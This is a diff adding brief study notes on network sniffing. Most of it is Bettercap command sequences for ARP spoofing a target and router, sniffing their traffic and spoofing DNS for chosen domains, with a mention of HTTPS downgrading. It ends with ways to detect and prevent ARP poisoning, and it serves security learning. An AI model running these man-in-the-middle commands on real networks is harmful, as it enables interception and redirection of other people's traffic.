@@ -1,0 +1,55 @@
+Sniffing:
+
+Types of sniffing:
+
+>Passive Sniffing:
+
+>Active Sniffing:
+ CAM table flooding: content addressable flooding
+
+ 1.ARP Poisoning:
+arp -a
+
+Tool:
+Bettercap:
+>bettercap -iface eth0
+>help
+>net.probe on (it is used to list all the IPs available in the same network)
+>net.show
+>help arp.spoof 
+>set arp.spoof.fullduplex True (To spoof both target and router)
+>set arp.spoof.targets <target IP>
+>arp.spoof on
+>set net.sniff.local true
+>net.sniff on
+
+Bypassing HTTPS:
+>Downgrade HTTPS to HTTP
+>HSTS(HTTP Strict Transport Security)
+
+2.DNS Spoofing:
+
+>help dns.spoof
+>set dns.spoof.all true
+>set dns.spoof.domains (domain name,*.domain name)
+>dns.spoof on
+
+3.Wireshark
+
+To detect ARP Posoining:
+>>tool: Xarp
+
+To prevent from ARP:
+
+Methos 1:
+>Use https everywhere plugin
+>Use VPN
+
+Method 2:
+>change dynamic to static
+
+
+
+
+
+
